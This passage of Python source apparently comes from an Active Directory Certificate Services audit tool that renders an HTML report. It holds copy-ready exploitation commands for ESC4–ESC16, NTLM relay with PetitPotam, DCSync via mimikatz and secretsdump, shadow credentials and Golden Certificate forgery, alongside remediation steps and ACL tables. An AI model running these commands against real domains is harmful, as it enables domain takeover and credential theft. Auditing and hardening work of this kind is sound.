              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'")]),

        esc_card("ESC4", "Vulnerable Template ACL", "CRITICAL",
            "A low-privileged principal holds a write permission (WriteDacl, WriteOwner, "
            "GenericAll, or GenericWrite) on the template object. The attacker modifies the "
            "template to enable ESC1 conditions, requests a certificate, then restores the "
            "original configuration.",
            ["Low-priv principal has WriteDacl / WriteOwner / GenericAll / GenericWrite on the template",
             "Template is enabled (or can be enabled)",
             "A CA that publishes this template is reachable"],
            [("Linux &mdash; Certipy (modify → exploit → restore)",
              f"# Step 1: save original config and enable EnrolleeSuppliesSubject\n"
              f"certipy template -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -template '{T4}' -save-old\n\n"
              f"# Step 2: request cert with target UPN (ESC1 now active)\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template '{T4}' -upn '&lt;TARGET&gt;@{D}'\n\n"
              f"# Step 3: restore template (opsec)\n"
              f"certipy template -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -template '{T4}' -configuration {T4}.json\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Windows &mdash; Certify",
              f"Certify.exe request /ca:'{HOST}\\{CA}' /template:'{T4}' /altname:'&lt;TARGET&gt;'")]),

        esc_card("ESC5", "Vulnerable PKI Object ACL", "HIGH",
            "A low-privileged principal holds a dangerous right on PKI infrastructure objects "
            "outside the certificate templates — such as the CA computer object or the "
            "CN=Public Key Services container. This can enable full PKI compromise.",
            ["Data outside standard cert template dumps required",
             "Vulnerable objects: CA computer object, CN=Public Key Services container and sub-objects",
             "Low-priv with GenericAll / WriteDacl / WriteOwner on any of these objects"],
            [("Detection &mdash; Certipy",
              f"certipy find -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -dc-ip '&lt;DC-IP&gt;' -vulnerable\n"
              f"# Look for ESC5 entries in the output"),
             ("Detection &mdash; BloodHound CE (Cypher query)",
              "MATCH p=(n)-[:GenericAll|WriteDacl|WriteOwner]->(m)\n"
              "WHERE m.name CONTAINS 'Public Key Services'\n"
              "   OR m.objecttype = 'pkicontainer'\n"
              "RETURN p"),
             ("Exploitation &mdash; grant GenericAll on enrollment service object",
              f"dacledit.py -action write -rights FullControl \\\n"
              f"  -principal '&lt;USER&gt;' \\\n"
              f"  -target-dn 'CN=Enrollment Services,CN=Public Key Services,...' \\\n"
              f"  -dc-ip '&lt;DC-IP&gt;' '{D}/&lt;USER&gt;:&lt;PASS&gt;'\n\n"
              f"# Then chain into ESC7: add yourself as CA Officer")]),

        esc_card("ESC6", "EDITF_ATTRIBUTESUBJECTALTNAME2", "CRITICAL",
            "The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled. Every certificate request "
            "submitted to this CA can specify an arbitrary SAN regardless of the template's "
            "Enrollee Supplies Subject setting — turning every enrollable template into ESC1.",
            ["EDITF_ATTRIBUTESUBJECTALTNAME2 flag set on the CA",
             "Any low-priv enrollable template published on the CA"],
            [("Linux &mdash; Certipy (any enrollable template)",
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template 'User' -upn '&lt;TARGET&gt;@{D}' -dc-ip '&lt;DC-IP&gt;'\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Windows &mdash; Certify + Rubeus",
              f"Certify.exe request /ca:'{HOST}\\{CA}' /template:'User' /altname:'&lt;TARGET&gt;'\n"
              f"Rubeus.exe asktgt /user:&lt;TARGET&gt; /certificate:cert.pfx \\\n"
              f"  /password:'' /domain:{D} /ptt")]),

        esc_card("ESC7", "Vulnerable CA ACL", "CRITICAL",
            "A low-privileged principal holds ManageCA or ManageCertificates rights on the CA. "
            "ManageCA allows enabling EDITF_ATTRIBUTESUBJECTALTNAME2 (leading to ESC6) and "
            "adding officers. ManageCertificates allows approving pending certificate requests.",
            ["Low-priv principal has ManageCA or ManageCertificates on the CA",
             "CA is reachable from the attacker host"],
            [("Linux &mdash; Certipy via SubCA template (ManageCA path)",
              f"# Add attacker as Certificate Officer\n"
              f"certipy ca -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -add-officer '&lt;USER&gt;'\n\n"
              f"# Enable SubCA template\n"
              f"certipy ca -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -enable-template 'SubCA'\n\n"
              f"# Request cert (will be Pending)\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template 'SubCA' -upn '&lt;TARGET&gt;@{D}'\n\n"
              f"# Issue the pending request\n"
              f"certipy ca -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -issue-request &lt;REQUEST-ID&gt;\n\n"
              f"# Retrieve issued certificate\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -retrieve &lt;REQUEST-ID&gt;\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Linux &mdash; Certipy (ManageCertificates: approve existing request)",
              f"certipy ca -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -issue-request &lt;REQUEST-ID&gt;\n"
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -retrieve &lt;REQUEST-ID&gt;")]),

        esc_card("ESC8", "NTLM Relay to Web Enrollment", "HIGH",
            "The CA's web enrollment interface (certsrv) is active. An attacker can coerce "
            "a DC's machine account to authenticate (via PetitPotam or PrinterBug) and relay "
            "that authentication to the web enrollment endpoint to obtain a DC certificate, "
            "enabling a full domain compromise.",
            ["Web enrollment endpoint (certsrv) is accessible via HTTP",
             "HTTPS is not enforced or Extended Protection for Authentication (EPA) is not configured",
             "Coercion primitive available (PetitPotam, PrinterBug, etc.)"],
            [("Linux &mdash; ntlmrelayx + PetitPotam",
              f"# Terminal 1: start NTLM relay to web enrollment\n"
              f"ntlmrelayx.py -t 'http://{HOST}/certsrv/certfnsh.asp' \\\n"
              f"  -smb2support --adcs --template 'DomainController'\n\n"
              f"# Terminal 2: coerce DC machine account authentication\n"
              f"PetitPotam.py &lt;ATTACKER-IP&gt; &lt;DC-IP&gt;\n"
              f"# or: printerbug.py '{D}/&lt;USER&gt;:&lt;PASS&gt;@&lt;DC-IP&gt;' &lt;ATTACKER-IP&gt;\n\n"
              f"certipy auth -pfx '&lt;DC&gt;$.pfx' -dc-ip '&lt;DC-IP&gt;'\n\n"
              f"secretsdump.py '{D}/&lt;DC&gt;$@&lt;DC-IP&gt;' \\\n"
              f"  -hashes ':&lt;NTLM-HASH&gt;' -just-dc-user Administrator")]),

        esc_card("ESC9", "No Security Extension — Template Level", "HIGH",
            "The template has CT_FLAG_NO_SECURITY_EXTENSION set: the SID security extension "
            "(szOID_NTDS_CA_SECURITY_EXT) is not embedded in issued certificates. "
            "When StrongCertificateBindingEnforcement &lt; 2 on DCs, an attacker with GenericWrite "
            "on a victim account can swap the victim's UPN, request a cert as the victim (no SID "
            "binding), restore the UPN, then authenticate as a different target.",
            ["CT_FLAG_NO_SECURITY_EXTENSION set on the template",
             "Template is enabled, Manager Approval not required",
             "StrongCertificateBindingEnforcement &lt; 2 on domain controllers",
             "Attacker has GenericWrite on the victim account",
             "Low-priv principal holds an enrollment right"],
            [("Linux &mdash; Certipy (UPN swap technique)",
              f"# Step 1: change victim UPN to the impersonation target\n"
              f"certipy account update -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -user 'victim_account' -upn '&lt;TARGET&gt;@{D}'\n\n"
              f"# Step 2: request cert as victim (cert carries target UPN, no SID extension)\n"
              f"certipy req -u 'victim_account@{D}' -p '&lt;VICTIM-PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -template '{T9}'\n\n"
              f"# Step 3: restore victim UPN (opsec)\n"
              f"certipy account update -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -user 'victim_account' -upn 'victim_account@{D}'\n\n"
              f"# Step 4: authenticate as target\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -domain '{D}' -dc-ip '&lt;DC-IP&gt;'")]),

        esc_card("ESC10", "Weak Certificate Mapping", "HIGH",
            "StrongCertificateBindingEnforcement on domain controllers is less than 2 (Disabled or "
            "Compatibility mode). Certificates without the SID security extension can still be used "
            "to authenticate. This amplifies ESC9, ESC15, and ESC16 by removing the SID-binding "
            "enforcement that would otherwise block exploitation.",
            ["StrongCertificateBindingEnforcement &lt; 2 on at least one DC",
             "This value is only visible in Certipy output with sufficient privileges"],
            [("Detection &mdash; via Certipy",
              f"certipy find -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -dc-ip '&lt;DC-IP&gt;' -vulnerable\n"
              f"# Look for ESC10 in findings"),
             ("Detection &mdash; Registry (on a DC)",
              "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc \\\n"
              "  /v StrongCertificateBindingEnforcement\n"
              "# 0 = Disabled, 1 = Compatibility, 2 = Full Enforcement (safe)")]),

        esc_card("ESC11", "CA RPC Without Encryption", "HIGH",
            "The CA does not set IF_ENFORCEENCRYPTICERTREQUEST, meaning the MS-ICPR RPC enrollment "
            "interface accepts unencrypted NTLM. An attacker can relay NTLM authentication from a "
            "domain machine to the CA RPC interface and obtain a certificate as the relayed account.",
            ["IF_ENFORCEENCRYPTICERTREQUEST not set on the CA",
             "NTLM relay is feasible (no SMB signing required network-wide)",
             "A coercion primitive is available (PetitPotam, PrinterBug, etc.)"],
            [("Linux &mdash; ntlmrelayx + PetitPotam",
              f"# Terminal 1: relay to CA RPC (MS-ICPR)\n"
              f"ntlmrelayx.py -t 'rpc://{HOST}' -rpc-mode ICPR \\\n"
              f"  --adcs --template 'DomainController' --no-http-server\n\n"
              f"# Terminal 2: coerce DC authentication\n"
              f"PetitPotam.py &lt;ATTACKER-IP&gt; &lt;DC-IP&gt;\n\n"
              f"certipy auth -pfx '&lt;DC&gt;$.pfx' -dc-ip '&lt;DC-IP&gt;'")]),

        esc_card("ESC12", "TPM Attestation Bypass", "MEDIUM",
            "The CA uses Microsoft Platform Crypto Provider with TPM-attested templates but "
            "does not properly validate the attestation statement. A software-key CSR can pass "
            "as TPM-attested, bypassing the attestation requirement.",
            ["CA uses Microsoft Platform Crypto Provider",
             "Template requires TPM key attestation",
             "CA server access required for full detection",
             "Attestation validation is insufficient or misconfigured"],
            [("Detection &mdash; on the CA server",
              "# Check for Platform Crypto Provider templates:\n"
              "certutil -v -template | findstr /i 'Platform Crypto'\n\n"
              "# Check CA key attestation settings:\n"
              "certutil -v -getreg CA\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\CAPathLength\n\n"
              f"# Via Certipy:\n"
              f"certipy find -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -dc-ip '&lt;DC-IP&gt;' -vulnerable"),
             ("Exploitation &mdash; submit software-key CSR with forged attestation",
              "# Tooling varies by CA version and attestation policy.\n"
              "# Refer to current ESC12 PoC in SpecterOps / Certipy repositories.\n"
              "# Pre-requisite: enrollment right on the attestation template.")]),

        esc_card("ESC13", "OID Group Link", "HIGH",
            "The template contains Issuance Policy OIDs. If any OID is linked to a privileged "
            "AD security group via an OID object (CN=OID,CN=Public Key Services), certificate "
            "holders gain effective group membership upon Kerberos authentication.",
            ["Template has Issuance Policy OIDs defined",
             "At least one OID is linked to a privileged AD group in CN=OID,...",
             "Template is enabled, Manager Approval not required, Client Auth EKU present",
             "Low-priv principal holds an enrollment right"],
            [("Linux &mdash; Certipy",
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -template '{T13}'\n\n"
              f"# Certificate grants group membership on Kerberos authentication:\n"
              f"certipy auth -pfx 'user.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Verify OID group link",
              f"ldapsearch -H ldap://&lt;DC-IP&gt; -b 'CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=...'\n"
              f"# Look for msDS-OIDToGroupLink attributes linking OIDs to groups")]),

        esc_card("ESC15", "Schema v1 Arbitrary EKU in CSR (EKUwu)", "CRITICAL",
            "Schema version 1 templates do not enforce application policies from the template "
            "definition when processing CSRs. An attacker can specify any EKU — including "
            "Client Authentication — directly in the CSR, bypassing template EKU restrictions. "
            "(CVE-2024-49019)",
            ["Template Schema Version = 1",
             "Template is enabled, Manager Approval not required",
             "Authorized Signatures Required = 0",
             "Low-priv principal holds an enrollment right"],
            [("Linux &mdash; Certipy (inject Client Authentication EKU)",
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template '{T15}' \\\n"
              f"  -application-policies 'Client Authentication'\n\n"
              f"certipy auth -pfx '&lt;USER&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Linux &mdash; Certipy (ESC15 + EnrolleeSuppliesSubject → impersonate any user)",
              f"certipy req -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' \\\n"
              f"  -template '{T15}' \\\n"
              f"  -application-policies 'Client Authentication' \\\n"
              f"  -upn '&lt;TARGET&gt;@{D}'\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'")]),

        esc_card("ESC16", "CA-Level SID Extension Disabled", "HIGH",
            "The CA has szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) in its "
            "DisableExtensionList. The SID security extension is omitted from every certificate "
            "issued by this CA — making it a CA-wide ESC9. Any enrollable template on this CA "
            "can be exploited via the UPN swap technique.",
            ["CA-level DisableExtensionList contains the SID extension OID",
             "StrongCertificateBindingEnforcement &lt; 2 on domain controllers",
             "Attacker has GenericWrite on a victim account"],
            [("Linux &mdash; Certipy (UPN swap — any enrollable template)",
              f"certipy account update -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -user 'victim_account' -upn '&lt;TARGET&gt;@{D}'\n\n"
              f"certipy req -u 'victim_account@{D}' -p '&lt;VICTIM-PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -template 'User'\n\n"
              f"certipy account update -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -user 'victim_account' -upn 'victim_account@{D}'\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -domain '{D}' -dc-ip '&lt;DC-IP&gt;'")]),
    ])

    # ------------------------------------------------------------------
    # Advanced techniques — accordion cards
    # ------------------------------------------------------------------
    def adv_card(title, desc, cmd_groups):
        cmd_html = ""
        for label, code in cmd_groups:
            cmd_html += (
                f'<div class="cmd-card">'
                f'<div class="cmd-lbl"><span class="cmd-icon">&#x276F;</span> {label}</div>'
                f'<pre class="cmd-pre">{code}</pre>'
                f'<button class="copy-btn" onclick="cpCmd(this)">&#10697; Copy</button>'
                f'</div>'
            )
        return (
            f'<details class="esc-card adv">'
            f'<summary class="esc-hdr">'
            f'<div class="esc-left">'
            f'<span class="esc-chip adv-chip">ADV</span>'
            f'<span class="esc-name">{title}</span>'
            f'</div>'
            f'<div class="esc-right"><span class="chevron">&#9660;</span></div>'
            f'</summary>'
            f'<div class="esc-body">'
            f'<p class="esc-desc">{desc}</p>'
            f'{cmd_html}'
            f'</div></details>'
        )

    adv_cards_html = "\n".join([
        adv_card("Pass-the-Certificate → NTLM Hash → DCSync",
            "After obtaining a certificate via any ESC, use PKINIT to retrieve a TGT and the "
            "account's NTLM hash, then DCSync the domain.",
            [("Linux &mdash; Certipy PKINIT + secretsdump",
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'\n"
              f"# Outputs &lt;TARGET&gt;.ccache and NTLM hash\n\n"
              f"secretsdump.py '{D}/&lt;TARGET&gt;@&lt;DC-IP&gt;' -hashes ':&lt;NTLM-HASH&gt;'\n\n"
              f"# Or use the ccache directly:\n"
              f"export KRB5CCNAME=&lt;TARGET&gt;.ccache\n"
              f"secretsdump.py -k -no-pass '{D}/&lt;TARGET&gt;@&lt;DC&gt;' -just-dc-ntlm"),
             ("Windows &mdash; Rubeus + Mimikatz",
              f"Rubeus.exe asktgt /user:&lt;TARGET&gt; /certificate:&lt;TARGET&gt;.pfx \\\n"
              f"  /password:'' /domain:{D} /ptt\n"
              f"mimikatz# lsadump::dcsync /domain:{D} /user:krbtgt")]),

        adv_card("Schannel LDAP Shell (no PKINIT required)",
            "Use the certificate directly for LDAP authentication via Schannel TLS "
            "client authentication — bypasses PKINIT entirely, useful when Kerberos is restricted.",
            [("Linux &mdash; certipy auth -ldap-shell",
              "certipy auth -pfx '&lt;TARGET&gt;.pfx' -ldap-shell -dc-ip '&lt;DC-IP&gt;'\n\n"
              "# Or with PassTheCert:\n"
              "python3 passthecert.py -dc-ip '&lt;DC-IP&gt;' -pfx '&lt;TARGET&gt;.pfx' -action whoami")]),

        adv_card("Shadow Credentials (WriteDacl / GenericAll on target user)",
            "If you hold WriteDacl or GenericAll on a target account, add a shadow credential "
            "(msDS-KeyCredentialLink) and authenticate using the shadow certificate — "
            "no need to modify template configuration.",
            [("Linux &mdash; Certipy shadow auto",
              f"certipy shadow auto -u '&lt;USER&gt;@{D}' -p '&lt;PASS&gt;' -account '&lt;TARGET&gt;'\n"
              f"# Automatically adds shadow cred, authenticates, dumps NTLM hash"),
             ("Windows &mdash; Whisker",
              f"Whisker.exe add /target:&lt;TARGET&gt;\n"
              f"Rubeus.exe asktgt /user:&lt;TARGET&gt; /certificate:&lt;base64&gt; \\\n"
              f"  /password:'&lt;PFX-PASS&gt;' /domain:{D} /ptt")]),

        adv_card("Golden Certificate (CA private key required — permanent forgery)",
            "With local admin on the CA server (via ESC5/ESC7 or direct compromise), "
            "export the CA private key and forge certificates offline for any user — indefinitely, "
            "without any CA contact. Cannot be revoked without replacing the CA.",
            [("Linux &mdash; Certipy backup + forge",
              f"# Export CA cert + private key (requires local admin on CA server)\n"
              f"certipy ca -u '&lt;CA-ADMIN&gt;@{D}' -p '&lt;PASS&gt;' \\\n"
              f"  -ca '{CA}' -target '{HOST}' -backup\n\n"
              f"# Forge cert for any user — completely offline\n"
              f"certipy forge -ca-pfx '{CA}.pfx' \\\n"
              f"  -upn '&lt;TARGET&gt;@{D}' -subject 'CN=&lt;TARGET&gt;'\n\n"
              f"certipy auth -pfx '&lt;TARGET&gt;.pfx' -dc-ip '&lt;DC-IP&gt;'"),
             ("Windows &mdash; Mimikatz + ForgeCert (GhostPack)",
              f"# On CA server — export CA private key\n"
              f"mimikatz# privilege::debug\n"
              f"mimikatz# crypto::capi\n"
              f"mimikatz# crypto::cng\n"
              f"mimikatz# crypto::certificates /systemstore:local_machine /store:my /export\n\n"
              f"# Forge offline (ForgeCert from GhostPack)\n"
              f"ForgeCert.exe --CaCertPath {CA}.pfx --CaCertPassword '' \\\n"
              f"  --Subject 'CN=&lt;TARGET&gt;' --SubjectAltName '&lt;TARGET&gt;@{D}' \\\n"
              f"  --NewCertPath forged.pfx --NewCertPassword ''\n\n"
              f"Rubeus.exe asktgt /user:&lt;TARGET&gt; /certificate:forged.pfx \\\n"
              f"  /password:'' /domain:{D} /ptt\n"
              f"mimikatz# lsadump::dcsync /domain:{D} /user:Administrator")]),
    ])

    # ------------------------------------------------------------------
    # Overview tab — remediation cards
    # ------------------------------------------------------------------
    REM_DATA = {
        "ESC1": ("CRITICAL", [
            "Disable <em>Enrollee Supplies Subject</em> (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) on the template",
            "Enable Manager Approval for all enrollment requests",
            "Restrict enrollment rights to specific named groups — not Domain Users or Domain Computers",
        ]),
        "ESC2": ("CRITICAL", [
            "Define specific EKUs — remove <em>Any Purpose</em> OID (2.5.29.37.0)",
            "Enable Manager Approval",
            "Restrict enrollment permissions to specific named groups",
        ]),
        "ESC3": ("CRITICAL", [
            "Remove Certificate Request Agent EKU from the template if not required",
            "Configure enrollment agent restrictions on the CA",
            "Set <em>Authorized Signatures Required</em> &gt; 0",
            "Enable Manager Approval",
        ]),
        "ESC4": ("CRITICAL", [
            "Remove WriteProperty / WriteDacl / WriteOwner / GenericAll from low-privilege groups",
            "Audit recent template modifications: Event ID 4899 on the CA",
            "Use Certipy or BloodHound CE to confirm the exact exploitable right",
        ]),
        "ESC6": ("CRITICAL", [
            "<code>certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</code>",
            "Or via PSPKI: <code>Remove-PolicyModuleFlag -Flag EDITF_ATTRIBUTESUBJECTALTNAME2</code>",
            "Restart the <em>CertSvc</em> service after applying the change",
        ]),
        "ESC7": ("CRITICAL", [
            "Remove ManageCA and ManageCertificates rights from low-privilege groups",
            "Restrict CA management to dedicated CA administrator accounts",
            "Audit CA configuration changes: Event ID 4873",
        ]),
        "ESC8": ("HIGH", [
            "Enforce HTTPS on certsrv/ — disable plain HTTP access",
            "Enable Extended Protection for Authentication (EPA / Channel Binding)",
            "Disable web enrollment entirely if the interface is not required",
        ]),
        "ESC9": ("HIGH", [
            "Remove CT_FLAG_NO_SECURITY_EXTENSION from msPKI-Enrollment-Flag on the template",
            "Set StrongCertificateBindingEnforcement = 2 on all domain controllers",
            "Apply KB5014754 and all Certifried patches",
        ]),
        "ESC10": ("HIGH", [
            "Set <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\\StrongCertificateBindingEnforcement = 2</code> on all DCs",
            "Apply KB5014754 and all subsequent patches",
            "Note: Full Enforcement became the default in February 2025 when the registry key is absent",
        ]),
        "ESC11": ("HIGH", [
            "Enable IF_ENFORCEENCRYPTICERTREQUEST: <code>certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST</code>",
            "Restart CertSvc after applying the flag",
            "Enforce SMB / RPC signing across the network",
        ]),
        "ESC13": ("HIGH", [
            "Remove issuance policy OIDs from templates if OID-to-group links are not required",
            "Audit <em>CN=OID,CN=Public Key Services</em> for sensitive group-link configurations",
            "Restrict enrollment to non-privileged groups for all affected templates",
        ]),
        "ESC15": ("CRITICAL", [
            "Upgrade template schema version from 1 to 2 or higher",
            "Enable Manager Approval on all schema v1 templates as interim mitigation",
            "Apply November 2024 patches (CVE-2024-49019)",
            "Restrict enrollment to specific named security groups",
        ]),
        "ESC16": ("HIGH", [
            "Remove szOID_NTDS_CA_SECURITY_EXT from the CA DisableExtensionList",
            "Verify: <code>certutil -v -getreg CA\\PolicyModules\\..\\DisableExtensionList</code>",
            "Set StrongCertificateBindingEnforcement = 2 on all domain controllers",
        ]),
    }

    # Mapping ESC id → short title for remediation cards (must be defined before use)
    REM_INFO = {
        "ESC1": "Subject Alternative Name Specification",
        "ESC2": "Any Purpose EKU Abuse",
        "ESC3": "Certificate Request Agent EKU",
        "ESC4": "Vulnerable Template ACL",
        "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2",
        "ESC7": "Vulnerable CA ACL",
        "ESC8": "NTLM Relay to Web Enrollment",
        "ESC9": "No Security Extension — Template Level",
        "ESC10": "Weak Certificate Mapping",
        "ESC11": "CA RPC Without Encryption",
        "ESC13": "OID Group Link",
        "ESC15": "Schema v1 Arbitrary EKU (EKUwu)",
        "ESC16": "CA-Level SID Extension Disabled",
    }

    rem_cards_html = ""
    detected_sorted = sorted(unique_vulns, key=lambda e: -_rank.get(esc_severity(e), 0))
    for esc_id in detected_sorted:
        if esc_id not in REM_DATA:
            continue
        sev_label, steps = REM_DATA[esc_id]
        sc = sev_label.lower()
        step_html = "".join(f"<li>{s}</li>" for s in steps)
        rem_cards_html += (
            f'<div class="rem-card">'
            f'<div class="rem-hdr">'
            f'<span class="esc-chip {sc}">{esc_id}</span>'
            f'<span class="rem-title">{REM_INFO.get(esc_id, esc_id)}</span>'
            f'<span class="badge {sc}">{sev_label}</span>'
            f'</div>'
            f'<ul class="rem-steps">{step_html}</ul>'
            f'</div>'
        )

    rem_cards_html += (
        '<div class="rem-card rem-general">'
        '<div class="rem-hdr"><span class="esc-chip gen-chip">&#9679;</span>'
        '<span class="rem-title">General Best Practices</span></div>'
        '<ul class="rem-steps">'
        '<li>Restrict enrollment rights to named security groups — never Domain Users or Domain Computers</li>'
        '<li>Audit certificate template and CA permissions regularly</li>'
        '<li>Monitor Event IDs 4886, 4887, 4899 for suspicious certificate requests</li>'
        '<li>Monitor Event ID 4873 for CA configuration changes</li>'
        '<li>Run Certipy or BloodHound CE periodically to detect new misconfigurations</li>'
        '</ul></div>'
    )

    if not detected_sorted:
        rem_cards_html = '<div class="no-vulns-box">&#10003; No vulnerabilities detected — no remediation required.</div>'

    # ------------------------------------------------------------------
    # ACL analysis sections
    # ------------------------------------------------------------------
    acl_html_parts = []
    for entry in acl_data:
        name = h(entry["name"])
        etype = entry["type"].upper()
        principals = entry.get("principals", {})
        domain_sid = entry.get("domain_sid", "")
        rows = []
        for sid, info in sorted(
            principals.items(),
            key=lambda x: (
                0 if is_low_priv_principal(get_friendly_name(x[0], domain_sid)) else 1,
                get_friendly_name(x[0], domain_sid),
            ),
        ):
            friendly = get_friendly_name(sid, domain_sid)
            is_lp = is_low_priv_principal(friendly)
            has_enroll = _has_enrollment_right(info["rights"])
            rights_list = sorted(info["rights"])
            _enroll_rights = {"Enroll", "AutoEnroll", "AllExtendedRights"}
            _write_rights = {"GenericAll", "WriteDacl", "WriteOwner", "GenericWrite",
                             "ManageCA", "ManageCertificates", "WriteProperty"}
            def _rbadge(r):
                if r in _enroll_rights:
                    return f'<span class="right-badge right-enroll">{h(r)}</span>'
                if r in _write_rights:
                    return f'<span class="right-badge right-danger">{h(r)}</span>'
                return f'<span class="right-badge">{h(r)}</span>'
            rights_html = "".join(_rbadge(r) for r in rights_list)
            rclass = ""
            tags = ""
            if is_lp and has_enroll:
                rclass = "row-danger"
                tags = '<span class="tag-lp">LOW-PRIV</span><span class="tag-enroll">CAN ENROLL</span>'
            elif is_lp:
                rclass = "row-warn"
                tags = '<span class="tag-lp">LOW-PRIV</span>'
            rows.append(
                f'<tr class="{rclass}">'
                f'<td class="principal-cell">{h(friendly)}</td>'
                f'<td><code class="sid-code">{h(sid)}</code></td>'
                f'<td>{h(info["type"])}</td>'
                f'<td class="rights-cell">{rights_html}</td>'
                f'<td>{tags}</td></tr>'
            )
        rows_html = "\n".join(rows) if rows else "<tr><td colspan='5' class='empty-row'>No principals found.</td></tr>"
        acl_html_parts.append(
            f'<div class="acl-block">'
            f'<div class="acl-block-hdr">'
            f'<span class="acl-type-badge">{etype}</span>'
            f'<span class="acl-name">{name}</span>'
            f'</div>'
            f'<table><thead><tr>'
            f'<th>Principal</th><th>SID</th><th>Type</th><th>Rights</th><th>Flags</th>'
            f'</tr></thead><tbody>{rows_html}</tbody></table></div>'
        )
    acl_content = "\n".join(acl_html_parts) if acl_html_parts else '<p class="no-data">No ACL data collected.</p>'

    # ------------------------------------------------------------------
    # Overview tab — vulnerability table
    # ------------------------------------------------------------------
    all_rows = []
    for r in vuln_records:
        status = "ENABLED" if r.get("enabled") else "DISABLED"
        sc = "status-enabled" if status == "ENABLED" else "status-disabled"
        escs_str = ", ".join(sorted(r.get("escs", [])))
        ws = worst_sev(r.get("escs", []))
        all_rows.append(
            f'<tr>'
            f'<td class="name-cell">{h(r["name"])}</td>'
            f'<td><span class="{sc}">{status}</span></td>'
            f'<td><span class="badge {ws.lower()}">{ws}</span></td>'
            f'<td>{h(escs_str)}</td>'
            f'<td>{h(r.get("ca_name",""))}</td>'
            f'<td>{h(r.get("exploitable_by",""))}</td>'
            f'</tr>'
        )
    for r in ca_vuln_records:
        escs_str = ", ".join(sorted(r.get("escs", [])))
        ws = worst_sev(r.get("escs", []))
        all_rows.append(
            f'<tr>'
            f'<td class="name-cell"><span class="ca-badge">CA</span> {h(r["ca_name"])}</td>'
            f'<td><span class="status-ca">CA</span></td>'
            f'<td><span class="badge {ws.lower()}">{ws}</span></td>'
            f'<td>{h(escs_str)}</td>'
            f'<td>{h(r["ca_name"])}</td>'
            f'<td>see CA findings</td>'
            f'</tr>'
        )
    table_body = "\n".join(all_rows) if all_rows else (
        '<tr><td colspan="6" class="no-vulns">&#10003; No vulnerabilities detected.</td></tr>'
    )

    n_templates = len(vuln_records)
    n_cas = len(ca_vuln_records)
    n_critical = sum(1 for r in (vuln_records + ca_vuln_records)
                     for e in r.get("escs", []) if esc_severity(e) == "CRITICAL")
    n_detected = len(unique_vulns)

    # ------------------------------------------------------------------
    # Assemble full HTML
    # ------------------------------------------------------------------
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ACE Analyzer Report</title>
<style>
:root{{
